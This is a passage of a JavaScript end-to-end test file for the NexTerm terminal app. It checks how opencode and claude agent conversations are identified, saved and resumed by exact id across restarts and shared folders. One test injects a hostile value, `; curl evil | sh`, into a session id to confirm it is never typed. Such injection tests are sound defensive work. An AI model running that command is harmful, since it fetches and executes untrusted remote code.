/**
 * Picking an opencode conversation back up — the one THIS terminal had.
 *
 * Until 2026-10-05 a terminal offered its agent back after a restart only
 * when NexTerm had started it (New opencode Terminal), and for opencode the
 * offer could only be "the most recent conversation in this folder": opencode
 * has no flag to choose an id up front, and two terminals on one folder both
 * landed on the same one. Measured then, opencode 1.18.34 names the
 * conversation it shows in the terminal's title (`OC | <title>`), and
 * `opencode session list --format json` maps a title to an id. So now:
 *
 * - an agent typed by hand at a prompt is remembered like one NexTerm started
 *   (and ended the same way, by its own exit);
 * - an opencode terminal's title is looked up (`agent_sessions`, narrowed to
 *   the terminal's directory) and the id kept, so the resume is `opencode -s
 *   <id>` — exact — and survives a restart;
 * - the banner can list the folder's conversations to pick another one.
 *
 * The backend is the browser mock here: `mockBridge.agentSessions` stands in
 * for `opencode session list`, `pty-title` events for what the backend reads
 * from the terminal's output. Writes to the terminal are held, as a shell
 * running a program holds them.
 */
import { describe, test, assert } from '../e2e/harness/testFramework.js';
import { serializeAgent, startCommand } from '../../src/lib/agents.js';
import { suggestStartupCommand } from '../../src/lib/startupCommands.js';
import * as terminalStore from '../../src/stores/terminalStore.js';
import { mockBridge } from '../../src/lib/ipc.js';
import { SCHEMA_VERSION } from '../../src/lib/persistence.js';
import { useSystemStore } from '../../src/stores/systemStore.js';

const T = terminalStore.useTerminalStore;
const { PERSIST_KEY } = terminalStore;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const tabById = (id) => T.getState().tabs.find((t) => t.id === id);

const UUID = 'd4bef4d0-c043-40ef-b157-640fb31ac0ea';
const SES_A = 'ses_aaaaaaaaaaaaAAAAAAAAAAAAAA';
const SES_B = 'ses_bbbbbbbbbbbbBBBBBBBBBBBBBB';
const SES_OLD = 'ses_oooooooooooOLDOLDOLDOLDOLD';
const SES_NEW = 'ses_nnnnnnnnnnnNEWNEWNEWNEWNEW';
const LONG = 'Fix the login bug in the OAuth callback handler';
/** What opencode puts in the terminal's title for a conversation called `title`. */
const ocTitle = (title) => `OC | ${title.length > 40 ? `${title.slice(0, 37)}\u2026` : title}`;

/** The shell drew a prompt: the D its integration sends with every one. */
const prompt = (tab, exitCode = 0) =>
  mockBridge.emit('pty-command-done', { session_id: tab.sessionId, exit_code: exitCode });
/** The shell started running the line: OSC 133 C. */
const started = (tab) => mockBridge.emit('pty-command-started', { session_id: tab.sessionId });
/** A program set the window title (read by the backend from its output). */
const titled = (tab, title) => mockBridge.emit('pty-title', { session_id: tab.sessionId, title });

/** Typed key by key, then Enter — the path every keystroke takes. */
async function typeLine(tabId, text) {
  for (const key of text) await T.getState().writeRaw(tabId, key);
  await T.getState().writeRaw(tabId, '\r');
}

/**
 * `fn` with the terminal's writes held (nothing answers them) and every
 * `agent_sessions` call counted — optionally answered late (`delayMs`, or one
 * delay per call in order), or refused.
 */
async function withBackend({ delayMs = 0, fail = null } = {}, fn) {
  const original = mockBridge.invoke;
  const calls = { writes: [], lookups: [] };
  mockBridge.invoke = async function (command, args, ...rest) {
    if (command === 'pty_write') {
      calls.writes.push(args?.data);
      return null;
    }
    if (command === 'agent_sessions') {
      const nth = calls.lookups.length;
      calls.lookups.push({ ...args });
      const wait = Array.isArray(delayMs) ? delayMs[nth] ?? 0 : delayMs;
      if (wait) await sleep(wait);
      if (fail) throw new Error(fail);
    }
    return original.call(this, command, args, ...rest);
  };
  try {
    await fn(calls);
  } finally {
    mockBridge.invoke = original;
  }
  return calls;
}

/** Scope a store test hook to `fn`. */
async function withHook(name, value, fn) {
  const previous = terminalStore[name](value);
  try {
    await fn();
  } finally {
    terminalStore[name](previous);
  }
}
/** Lookups after 5 ms of quiet rather than 400. */
const quickly = (fn) => withHook('__setAgentResolveDelayMs', 5, fn);
/** Long enough for a lookup to be made and answered. */
const settle = () => sleep(40);

/** A terminal whose shell has drawn its first prompt. */
async function readyTerminal() {
  await T.getState().init();
  const tab = await T.getState().createTab();
  assert.ok(tab, 'setup: a terminal');
  await prompt(tab);
  return tabById(tab.id);
}

/** The conversations `opencode session list` would print. */
function conversations(list) {
  mockBridge.agentSessions = list;
}

// ---- A disk of our own, for the cases that relaunch -----------------------

const backing = new Map();
const shim = {
  getItem: (k) => (backing.has(k) ? backing.get(k) : null),
  setItem: (k, v) => backing.set(k, String(v)),
  removeItem: (k) => backing.delete(k),
  clear: () => backing.clear(),
};
const onDisk = () => {
  const raw = backing.get(PERSIST_KEY);
  return raw ? JSON.parse(raw).data : null;
};

async function withOwnDisk(fn) {
  const borrowed = globalThis.localStorage;
  globalThis.localStorage = shim;
  try {
    await fn();
  } finally {
    T.getState().dispose();
    globalThis.localStorage = borrowed;
  }
}

async function relaunch({ seed = null } = {}) {
  T.getState().dispose();
  if (seed) {
    backing.clear();
    backing.set(PERSIST_KEY, JSON.stringify({ version: SCHEMA_VERSION, data: seed }));
  }
  T.setState({ tabs: [], activeTabId: null, isInitialized: false });
  await T.getState().init();
}

const workspaceRunning = (agent, cwd = '/workspace') => ({
  workspaceName: 'Default',
  activeGroupId: 'group-agent',
  groups: [
    {
      id: 'group-agent', name: 'Agents', createdAt: 1, activePaneId: 'pane-agent',
      tree: { type: 'leaf', id: 'pane-agent', tabIds: ['tab-agent'], activeTabId: 'tab-agent' },
    },
  ],
  tabs: [{ id: 'tab-agent', title: 'Terminal 1', cwd, agent }],
});

async function closeAll() {
  for (const t of [...T.getState().tabs]) await T.getState().closeTab(t.id);
  mockBridge.agentSessions = [];
}

describe('An agent typed by hand is remembered like one NexTerm started', () => {
  test('OR-01: `opencode` typed at a prompt is recorded, watched, and ended by its own exit', async () => {
    const tab = await readyTerminal();
    try {
      await withBackend({}, async () => {
        await typeLine(tab.id, 'opencode');
      });
      let t = tabById(tab.id);
      assert.equal(t.agent?.kind, 'opencode');
      assert.equal(t.agent.sessionId, null, 'which conversation is not known yet');
      assert.equal(t.agentResumeOffered, false);
      assert.deepEqual(t.agentTyped, { sessionId: tab.sessionId }, 'watched from this line on');
      assert.equal(serializeAgent(t.agent).kind, 'opencode', 'what a restart would offer back');

      await started(tab);
      assert.equal(tabById(tab.id).agent?.kind, 'opencode', 'running');
      await prompt(tab);
      t = tabById(tab.id);
      assert.equal(t.agent, null, 'its exit ends the record, as for an agent NexTerm started');
    } finally {
      await closeAll();
    }
  });

  test('OR-02: a shell that has never reported a command\'s end keeps nothing — nothing could ever end it', async () => {
    await T.getState().init();
    const tab = await T.getState().createTab();
    try {
      await withBackend({}, async () => {
        await typeLine(tab.id, 'opencode');
      });
      const t = tabById(tab.id);
      assert.equal(t.agent ?? null, null);
      assert.equal(t.commandLine, 'opencode', 'the line is still followed for templates');
    } finally {
      await closeAll();
    }
  });

  test('OR-03: started by hand while the offer shows, the new agent replaces the offer', async () => {
    const tab = await readyTerminal();
    try {
      T.setState((s) => ({
        tabs: s.tabs.map((t) =>
          t.id === tab.id
            ? { ...t, agent: { kind: 'opencode', sessionId: SES_OLD, startedAt: 1, title: 'Old one' }, agentResumeOffered: true }
            : t
        ),
      }));
      await withBackend({}, async () => {
        await typeLine(tab.id, 'opencode -c');
      });
      const t = tabById(tab.id);
      assert.equal(t.agentResumeOffered, false, 'the offer is gone');
      assert.equal(t.agent.kind, 'opencode');
      assert.equal(t.agent.sessionId, null, 'not the old conversation: -c is the latest, whichever it is');
      assert.equal(t.agent.title, null);
    } finally {
      await closeAll();
    }
  });

  test('OR-04: NexTerm\'s own lines are not taken for typed ones — claude keeps the id it was started with', async () => {
    const tab = await readyTerminal();
    try {
      let agent;
      const { writes } = await withBackend({}, async () => {
        agent = await T.getState().startAgent(tab.id, 'claude');
      });
      assert.deepEqual(writes, [`claude --session-id ${agent.sessionId}\r`]);
      assert.equal(tabById(tab.id).agent.sessionId, agent.sessionId);
      assert.equal(tabById(tab.id).agent.startedAt, agent.startedAt, 'the same record, not a new one');
    } finally {
      await closeAll();
    }
  });

  test('OR-05: a line that names its conversation is remembered with it', async () => {
    const tab = await readyTerminal();
    try {
      await withBackend({}, async () => {
        await typeLine(tab.id, `opencode -s ${SES_A}`);
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_A);
      await started(tab);
      await prompt(tab);

      await withBackend({}, async () => {
        await typeLine(tab.id, `claude --resume ${UUID}`);
      });
      assert.deepEqual(
        { kind: tabById(tab.id).agent.kind, sessionId: tabById(tab.id).agent.sessionId },
        { kind: 'claude', sessionId: UUID }
      );
    } finally {
      await closeAll();
    }
  });
});

describe('An opencode terminal learns which conversation it shows', () => {
  test('OR-06: its title is looked up in its own directory, and the id and full title are kept', async () => {
    const tab = await readyTerminal();
    try {
      conversations([
        { id: SES_A, title: LONG, updated: 200, created: 100, directory: tab.cwd },
        { id: SES_B, title: 'Something else', updated: 300, created: 250, directory: tab.cwd },
        { id: 'ses_ccccccccccccELSEWHEREELSEW', title: LONG, updated: 999, created: 998, directory: '/elsewhere' },
      ]);
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OpenCode'); // its home screen: no conversation yet
          await settle();
          assert.equal(tabById(tab.id).agent.sessionId, null);
          await titled(tab, ocTitle(LONG)); // cut to 37 + …
          await settle();
        });
        assert.deepEqual(lookups, [{ kind: 'opencode', cwd: tab.cwd }], 'one lookup, for the terminal\'s directory');
      });
      const agent = tabById(tab.id).agent;
      assert.equal(agent.sessionId, SES_A, 'the directory\'s own, not the newer one elsewhere');
      assert.equal(agent.title, LONG, 'the full title, not the cut one');
      const stored = serializeAgent(agent);
      assert.equal(stored.sessionId, SES_A);
      assert.equal(stored.title, LONG);
    } finally {
      await closeAll();
    }
  });

  test('OR-07: the same title again, its home screen and its exit title cost no lookup and change nothing', async () => {
    const tab = await readyTerminal();
    try {
      conversations([{ id: SES_A, title: 'Hello', updated: 1, created: 1, directory: tab.cwd }]);
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          for (let i = 0; i < 4; i += 1) await titled(tab, 'OC | Hello'); // redrawn
          await settle();
          await titled(tab, 'OC | Hello');
          await titled(tab, 'OpenCode');
          await titled(tab, '');
          await titled(tab, 'zsh — ~/project'); // another program's
          await settle();
        });
        assert.equal(lookups.length, 1);
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_A);
      assert.equal(tabById(tab.id).agent.title, 'Hello');
    } finally {
      await closeAll();
    }
  });

  test('OR-08: switching conversations inside opencode moves the record with it — and back', async () => {
    const tab = await readyTerminal();
    try {
      conversations([
        { id: SES_A, title: 'First', updated: 10, created: 1, directory: tab.cwd },
        { id: SES_B, title: 'Second', updated: 20, created: 2, directory: tab.cwd },
      ]);
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OC | First');
          await settle();
          assert.equal(tabById(tab.id).agent.sessionId, SES_A);
          await titled(tab, 'OC | Second');
          // Until the lookup answers, the old id must not stand for the new title.
          assert.equal(tabById(tab.id).agent.sessionId, null, 'a stale id outlived the switch');
          assert.equal(tabById(tab.id).agent.title, 'Second');
          await settle();
          assert.equal(tabById(tab.id).agent.sessionId, SES_B);
          await titled(tab, 'OC | First');
          await settle();
        });
        assert.equal(lookups.length, 3);
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_A);
    } finally {
      await closeAll();
    }
  });

  test('OR-09: opened with -s, an older conversation keeps its own id although a newer one has the same title', async () => {
    const tab = await readyTerminal();
    try {
      conversations([
        { id: SES_OLD, title: 'Hello from the mock.', updated: 100, created: 90, directory: tab.cwd },
        { id: SES_NEW, title: 'Hello from the mock.', updated: 900, created: 890, directory: tab.cwd },
      ]);
      await quickly(async () => {
        await withBackend({}, async () => {
          await typeLine(tab.id, `opencode -s ${SES_OLD}`);
          await started(tab);
          await titled(tab, 'OC | Hello from the mock.');
          assert.equal(tabById(tab.id).agent.sessionId, SES_OLD, 'not dropped while it is looked up');
          await settle();
        });
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_OLD);
      assert.equal(tabById(tab.id).agent.title, 'Hello from the mock.');
    } finally {
      await closeAll();
    }
  });

  test('OR-10: a lookup answered after a newer title, or after opencode exited, writes nothing', async () => {
    const tab = await readyTerminal();
    try {
      conversations([
        { id: SES_A, title: 'First', updated: 10, created: 1, directory: tab.cwd },
        { id: SES_B, title: 'Second', updated: 20, created: 2, directory: tab.cwd },
      ]);
      await quickly(async () => {
        // The lookup for the older title answers LAST.
        await withBackend({ delayMs: [150, 10] }, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OC | First');
          await sleep(20); // its lookup is under way
          await titled(tab, 'OC | Second');
          await sleep(60);
          assert.equal(tabById(tab.id).agent.sessionId, SES_B, 'setup: the newer title\'s answer came first');
          await sleep(150);
        });
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_B, 'the slower answer for the older title won');
      assert.equal(tabById(tab.id).agent.title, 'Second');

      await quickly(async () => {
        await withBackend({ delayMs: 60 }, async () => {
          await titled(tab, 'OC | First');
          await sleep(20);
          await prompt(tab); // opencode exits while the lookup is out
          await sleep(150);
        });
      });
      assert.equal(tabById(tab.id).agent, null, 'a late answer brought the record back');
    } finally {
      await closeAll();
    }
  });

  test('OR-11: a lookup that fails leaves the folder\'s latest as the resume, and says so once', async () => {
    const tab = await readyTerminal();
    const warn = console.warn;
    const warned = [];
    console.warn = (...args) => warned.push(args.join(' '));
    try {
      await quickly(async () => {
        await withBackend({ fail: 'opencode was not found on PATH' }, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OC | First');
          await settle();
          await titled(tab, 'OC | Second');
          await settle();
        });
      });
      const agent = tabById(tab.id).agent;
      assert.equal(agent.sessionId, null);
      assert.equal(agent.title, 'Second', 'the title is still worth showing');
      assert.ok(warned.length <= 1, `reported ${warned.length} times`);
    } finally {
      console.warn = warn;
      await closeAll();
    }
  });

  test('OR-12: titles only matter while opencode runs there — not for claude, not for a plain shell, not for an offer', async () => {
    const tab = await readyTerminal();
    try {
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await titled(tab, 'OC | Looks like opencode'); // a plain shell
          await typeLine(tab.id, 'claude');
          await started(tab);
          await titled(tab, 'OC | Still not opencode');
          await settle();
          await prompt(tab);
          T.setState((s) => ({
            tabs: s.tabs.map((t) =>
              t.id === tab.id ? { ...t, agent: { kind: 'opencode', sessionId: null, startedAt: 1, title: null }, agentResumeOffered: true } : t
            ),
          }));
          await titled(tab, 'OC | An offer is not a running agent');
          await settle();
        });
        assert.deepEqual(lookups, []);
      });
      assert.equal(tabById(tab.id).agent.title, null);
    } finally {
      await closeAll();
    }
  });
});

describe('Started again in the same terminal', () => {
  test('OR-18: quit and continued into the same conversation, the new record learns its id afresh', async () => {
    const tab = await readyTerminal();
    try {
      conversations([{ id: SES_A, title: 'Same one', updated: 1, created: 1, directory: tab.cwd }]);
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OC | Same one');
          await settle();
          assert.equal(tabById(tab.id).agent.sessionId, SES_A);
          await titled(tab, ''); // as it quits
          await prompt(tab);
          assert.equal(tabById(tab.id).agent, null);

          await typeLine(tab.id, 'opencode -c');
          await started(tab);
          assert.equal(tabById(tab.id).agent.sessionId, null, 'a new record');
          await titled(tab, 'OC | Same one'); // the title the last record already saw
          await settle();
        });
        assert.equal(lookups.length, 2, 'the second record looked its title up too');
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_A);
    } finally {
      await closeAll();
    }
  });
});

describe('After a restart, that conversation is offered back', () => {
  test('OR-13: the id and title reach the disk, come back offered, and resume exactly — with no lookup', async () => {
    await withOwnDisk(async () => {
      await relaunch({ seed: workspaceRunning(null) });
      const tab = T.getState().tabs[0];
      await prompt(tab);
      conversations([{ id: SES_A, title: LONG, updated: 5, created: 1, directory: tab.cwd }]);
      await quickly(async () => {
        await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, ocTitle(LONG));
          await settle();
        });
      });
      await sleep(400); // the write-behind
      assert.equal(onDisk().tabs[0].agent.sessionId, SES_A);
      assert.equal(onDisk().tabs[0].agent.title, LONG);

      await relaunch(); // NexTerm quit while opencode ran
      const back = T.getState().tabs[0];
      assert.equal(back.agentResumeOffered, true);
      assert.equal(back.agent.sessionId, SES_A);
      await prompt(back);
      await quickly(async () => {
        const { writes, lookups } = await withBackend({}, async () => {
          assert.equal(await T.getState().resumeAgent(back.id), true);
          await started(back);
          await titled(back, ocTitle(LONG)); // what opencode shows for it at once (measured)
          await settle();
        });
        assert.deepEqual(writes, [`opencode -s ${SES_A}\r`]);
        assert.deepEqual(lookups, [], 'the conversation it was resumed into needs no lookup');
      });
      assert.equal(tabById(back.id).agent.sessionId, SES_A);
    });
  });

  test('OR-14: a conversation picked from the list is resumed instead — and an id that is not one is not typed', async () => {
    await withOwnDisk(async () => {
      await relaunch({ seed: workspaceRunning({ kind: 'opencode', sessionId: SES_A, startedAt: 1, title: 'First' }) });
      const tab = T.getState().tabs[0];
      await prompt(tab);
      const { writes } = await withBackend({}, async () => {
        assert.equal(await T.getState().resumeAgent(tab.id, { sessionId: SES_B, title: 'Second' }), true);
      });
      assert.deepEqual(writes, [`opencode -s ${SES_B}\r`]);
      assert.equal(tabById(tab.id).agent.sessionId, SES_B);
      assert.equal(tabById(tab.id).agent.title, 'Second');

      await relaunch({ seed: workspaceRunning({ kind: 'opencode', sessionId: SES_A, startedAt: 1, title: 'First' }) });
      const again = T.getState().tabs[0];
      await prompt(again);
      const hostile = await withBackend({}, async () => {
        await T.getState().resumeAgent(again.id, { sessionId: `${SES_B}; curl evil | sh`, title: 'x' });
      });
      assert.deepEqual(hostile.writes, [`opencode -s ${SES_A}\r`], 'the remembered one, not the bad pick');
    });
  });

  test('OR-15: the list is the folder\'s own conversations, newest first; claude has none to list', async () => {
    await withOwnDisk(async () => {
      await relaunch({ seed: workspaceRunning({ kind: 'opencode', sessionId: null, startedAt: 1, title: null }, '/workspace') });
      const tab = T.getState().tabs[0];
      conversations([
        { id: SES_A, title: 'Older', updated: 1, created: 1, directory: '/workspace' },
        { id: SES_B, title: 'Newer', updated: 2, created: 2, directory: '/workspace/' },
        { id: SES_NEW, title: 'Elsewhere', updated: 3, created: 3, directory: '/other' },
      ]);
      const listed = await T.getState().listAgentSessions(tab.id);
      assert.deepEqual(listed.map((x) => x.id), [SES_B, SES_A]);

      await relaunch({ seed: workspaceRunning(startCommand('claude').agent) });
      assert.deepEqual(await T.getState().listAgentSessions(T.getState().tabs[0].id), []);
      mockBridge.agentSessions = [];
    });
  });
});

// ---- Several terminals on one folder ----------------------------------------
//
// Reported from Windows (2026-10-13): four OpenCode terminals, each in its own
// conversation; NexTerm quit and started again, Resume pressed in each — and
// three of them came back in the SAME conversation. A record with no id typed
// `opencode --continue`, the folder's most recent, into every one of them.

const SES_C = 'ses_ccccccccccccCCCCCCCCCCCCCC';
const SES_D = 'ses_ddddddddddddDDDDDDDDDDDDDD';
const SES_E = 'ses_eeeeeeeeeeeeEEEEEEEEEEEEEE';

/** A saved workspace of terminals in `cwd`, one per agent record, in one pane. */
const workspaceOf = (agents, cwd = '/workspace') => ({
  workspaceName: 'Default',
  activeGroupId: 'group-agents',
  groups: [
    {
      id: 'group-agents', name: 'Agents', createdAt: 1, activePaneId: 'pane-agents',
      tree: { type: 'leaf', id: 'pane-agents', tabIds: agents.map((_, i) => `tab-${i + 1}`), activeTabId: 'tab-1' },
    },
  ],
  tabs: agents.map((agent, i) => ({ id: `tab-${i + 1}`, title: `Terminal ${i + 1}`, cwd, agent })),
});

/** An opencode record as a quit leaves it on disk. */
const ocRecord = (startedAt, title = null, sessionId = null) => ({ kind: 'opencode', sessionId, startedAt, title });

/** Relaunched into `seed`, every restored shell at its first prompt. Resolves with the tab ids, in order. */
async function restoredTerminals(seed) {
  await relaunch({ seed });
  for (const t of T.getState().tabs) await prompt(t);
  return T.getState().tabs.map((t) => t.id);
}

/**
 * What `fn` typed into each terminal, by tab id, and every `agent_sessions`
 * call. `answer(nth, args, asTheMockWould)` may stand in for the backend:
 * throw for a lookup that fails, wait for a slow one.
 */
async function typedInto(fn, { answer = null } = {}) {
  const original = mockBridge.invoke;
  const typed = {};
  const lookups = [];
  mockBridge.invoke = async function (command, args, ...rest) {
    if (command === 'pty_write') {
      const key = T.getState().tabs.find((t) => t.sessionId === args?.session_id)?.id ?? args?.session_id;
      (typed[key] ??= []).push(args?.data);
      return null;
    }
    if (command === 'agent_sessions') {
      lookups.push({ ...args });
      if (answer) return answer(lookups.length - 1, args, () => original.call(this, command, args, ...rest));
    }
    return original.call(this, command, args, ...rest);
  };
  try {
    await fn();
  } finally {
    mockBridge.invoke = original;
  }
  return { typed, lookups };
}

/**
 * `withOwnDisk`, every terminal closed after: one case's records and claims
 * must not decide the next one's picks.
 */
const isolated = (fn) =>
  withOwnDisk(async () => {
    try {
      await fn();
    } finally {
      await closeAll();
    }
  });

/** Every `--continue` typed, anywhere. */
const blindContinues = (typed) => Object.values(typed).flat().filter((line) => /--continue/.test(line));

describe('Every terminal resumes its own conversation', () => {
  test('OR-19: four terminals on one folder that never learned their ids each resume their own, by id', async () => {
    await isolated(async () => {
      const titles = ['Alpha', 'Beta', 'Gamma', 'Delta'];
      const ids = [SES_A, SES_B, SES_C, SES_D];
      const tabs = await restoredTerminals(workspaceOf(titles.map((title, i) => ocRecord(i + 1, title))));
      assert.equal(tabs.length, 4, 'setup: four terminals came back');
      conversations([
        ...titles.map((title, i) => ({ id: ids[i], title, updated: 10 + i, created: i + 1, directory: '/workspace' })),
        // The folder's most recent: what `--continue` opened in each of them.
        { id: SES_E, title: 'Something newer', updated: 99, created: 50, directory: '/workspace' },
      ]);
      const { typed, lookups } = await typedInto(async () => {
        for (const id of tabs) assert.equal(await T.getState().resumeAgent(id), true, `${id} typed nothing`);
      });
      assert.deepEqual(
        typed,
        Object.fromEntries(tabs.map((id, i) => [id, [`opencode -s ${ids[i]}\r`]])),
        'each its own, by id'
      );
      assert.equal(lookups.length, 4, 'looked up when Resume was pressed, once each');
      tabs.forEach((id, i) => {
        assert.equal(tabById(id).agent.sessionId, ids[i]);
        assert.equal(tabById(id).agentResumeOffered, false);
      });
      await sleep(400); // the write-behind
      assert.deepEqual(onDisk().tabs.map((t) => t.agent.sessionId), ids, 'and the next restart knows them');
    });
  });

  test('OR-20: pressed in four terminals at once and answered out of order, each named one gets its own and same-titled ones type nothing', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(
        workspaceOf([ocRecord(1, 'Alpha'), ocRecord(2, 'Beta'), ocRecord(3, 'Hello'), ocRecord(4, 'Hello')])
      );
      conversations([
        { id: SES_A, title: 'Alpha', updated: 10, created: 1, directory: '/workspace' },
        { id: SES_B, title: 'Beta', updated: 20, created: 2, directory: '/workspace' },
        { id: SES_C, title: 'Hello', updated: 30, created: 3, directory: '/workspace' },
        { id: SES_D, title: 'Hello', updated: 40, created: 4, directory: '/workspace' },
      ]);
      const { typed } = await typedInto(
        async () => {
          const resumed = await Promise.all(tabs.map((id) => T.getState().resumeAgent(id)));
          assert.deepEqual(resumed, [true, true, false, false]);
        },
        {
          // The first asked answers last; two answer in the same turn.
          answer: async (nth, _args, asTheMockWould) => {
            await sleep([60, 20, 20, 0][nth] ?? 0);
            return asTheMockWould();
          },
        }
      );
      assert.deepEqual(typed, { [tabs[0]]: [`opencode -s ${SES_A}\r`], [tabs[1]]: [`opencode -s ${SES_B}\r`] });
      assert.deepEqual(blindContinues(typed), []);
      for (const id of tabs.slice(2)) assert.equal(tabById(id).agentResumeNotice?.kind, 'unsure');
    });
  });

  test('OR-21: two terminals offering one title back ask \u{2014} however their conversations\u{2019} times line up with their agents\u{2019}', async () => {
    // From the review (2026-10-13): a conversation is created at its first
    // message, not when its agent starts; an old one can be reopened; a
    // closed terminal leaves one behind. Dealing them out by age swapped
    // them, and the swap was typed as an exact id.
    const layouts = {
      'messaged in the other order': [
        { id: SES_A, title: 'Hello', created: 300, updated: 900, directory: '/workspace' },
        { id: SES_B, title: 'Hello', created: 210, updated: 950, directory: '/workspace' },
      ],
      'an old one reopened': [
        { id: SES_A, title: 'Hello', created: 101, updated: 900, directory: '/workspace' },
        { id: SES_D, title: 'Hello', created: 50, updated: 950, directory: '/workspace' },
      ],
      'one left by a closed terminal': [
        { id: SES_A, title: 'Hello', created: 101, updated: 900, directory: '/workspace' },
        { id: SES_C, title: 'Hello', created: 150, updated: 160, directory: '/workspace' },
        { id: SES_B, title: 'Hello', created: 201, updated: 950, directory: '/workspace' },
      ],
    };
    await isolated(async () => {
      for (const [how, list] of Object.entries(layouts)) {
        for (const order of [[0, 1], [1, 0]]) {
          const tabs = await restoredTerminals(workspaceOf([ocRecord(100, 'Hello'), ocRecord(200, 'Hello')]));
          conversations(list);
          const { typed } = await typedInto(async () => {
            for (const at of order) assert.equal(await T.getState().resumeAgent(tabs[at]), false, `${how}, ${order}`);
          });
          assert.deepEqual(typed, {}, `${how}, pressed in the order ${order}: a guess typed as an exact id`);
          for (const id of tabs) assert.equal(tabById(id).agentResumeNotice?.kind, 'unsure', how);
        }
      }
    });
  });

  test('OR-22: running, two terminals that show one title learn neither conversation \u{2014} rather than a guess', async () => {
    const first = await readyTerminal();
    const second = await readyTerminal();
    try {
      conversations([
        { id: SES_OLD, title: 'Hello', updated: 900, created: 100, directory: first.cwd },
        { id: SES_NEW, title: 'Hello', updated: 300, created: 200, directory: first.cwd },
      ]);
      assert.equal(second.cwd, first.cwd, 'setup: one folder');
      await quickly(() =>
        withHook('__setAgentResolveRetryMs', [], async () => {
          await withBackend({}, async () => {
            await typeLine(first.id, 'opencode');
            await started(first);
            await sleep(5);
            await typeLine(second.id, 'opencode');
            await started(second);
            await titled(second, 'OC | Hello');
            await titled(first, 'OC | Hello');
            await settle();
          });
        })
      );
      assert.equal(tabById(first.id).agent.sessionId, null);
      assert.equal(tabById(second.id).agent.sessionId, null);
    } finally {
      await closeAll();
    }
  });

  test('OR-34: running, a terminal never learns a conversation another terminal already has \u{2014} though it was written to last', async () => {
    const first = await readyTerminal();
    const second = await readyTerminal();
    try {
      // The first terminal's conversation is the one being written to, so it
      // is the most recently updated of the two called "Hello".
      conversations([
        { id: SES_OLD, title: 'Hello', updated: 900, created: 100, directory: first.cwd },
        { id: SES_NEW, title: 'Hello', updated: 300, created: 200, directory: first.cwd },
      ]);
      await quickly(async () => {
        await withBackend({}, async () => {
          await typeLine(first.id, 'opencode');
          await started(first);
          await titled(first, 'OC | Hello');
          await settle();
          assert.equal(tabById(first.id).agent.sessionId, SES_OLD, 'setup: the first knows its own');
          await typeLine(second.id, 'opencode');
          await started(second);
          await titled(second, 'OC | Hello');
          await settle();
        });
      });
      assert.equal(tabById(second.id).agent.sessionId, SES_NEW, 'took the conversation the first terminal is in');
    } finally {
      await closeAll();
    }
  });

  test('OR-23: with no titles to go on, terminals in one run all ask \u{2014} none guesses the newest', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(workspaceOf([ocRecord(1), ocRecord(2), ocRecord(3)]));
      conversations([
        { id: SES_A, title: 'Alpha', updated: 10, created: 1, directory: '/workspace' },
        { id: SES_B, title: 'Beta', updated: 20, created: 2, directory: '/workspace' },
        { id: SES_C, title: 'Gamma', updated: 30, created: 3, directory: '/workspace' },
      ]);
      const asked = await typedInto(async () => {
        for (const id of tabs) assert.equal(await T.getState().resumeAgent(id), false);
      });
      assert.deepEqual(asked.typed, {}, 'any of them could have been the newest\u{2019}s');
      for (const id of tabs) {
        const t = tabById(id);
        assert.equal(t.agentResumeOffered, true, 'the offer stays');
        assert.equal(t.agentResumeNotice?.kind, 'unsure', 'and says it could not tell');
        assert.equal(t.agentResumeLooking, false);
      }
      assert.notEqual(tabById(tabs[0]).agentResumeNotice.seq, tabById(tabs[1]).agentResumeNotice.seq);

      const chosen = await typedInto(async () => {
        // The user picks for two from the list...
        assert.equal(await T.getState().resumeAgent(tabs[0], { sessionId: SES_C, title: 'Gamma' }), true);
        assert.equal(await T.getState().resumeAgent(tabs[1], { sessionId: SES_A, title: 'Alpha' }), true);
        // ...and the third, though the last left, still does not guess.
        assert.equal(await T.getState().resumeAgent(tabs[2]), false);
      });
      assert.deepEqual(chosen.typed, {
        [tabs[0]]: [`opencode -s ${SES_C}\r`],
        [tabs[1]]: [`opencode -s ${SES_A}\r`],
      });
      assert.equal(tabById(tabs[0]).agentResumeNotice, null, 'the notice goes with the offer');
    });
  });

  test('OR-24: a terminal with no title among others that have theirs asks, while they resume by name', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(workspaceOf([ocRecord(1), ocRecord(2, 'Gamma'), ocRecord(3, 'Beta')]));
      conversations([
        { id: SES_A, title: 'Alpha', updated: 10, created: 1, directory: '/workspace' },
        { id: SES_B, title: 'Beta', updated: 20, created: 2, directory: '/workspace' },
        { id: SES_C, title: 'Gamma', updated: 30, created: 3, directory: '/workspace' },
      ]);
      const { typed } = await typedInto(async () => {
        for (const id of tabs) await T.getState().resumeAgent(id);
      });
      assert.deepEqual(typed, { [tabs[1]]: [`opencode -s ${SES_C}\r`], [tabs[2]]: [`opencode -s ${SES_B}\r`] });
      assert.equal(tabById(tabs[0]).agentResumeNotice?.kind, 'unsure');
    });
  });

  test('OR-25: the list cannot be read and the folder is shared \u{2014} nothing blind is typed, and the backend\'s reason is shown', async () => {
    await isolated(async () => {
      const warn = console.warn;
      const warned = [];
      console.warn = (...args) => warned.push(args.join(' '));
      try {
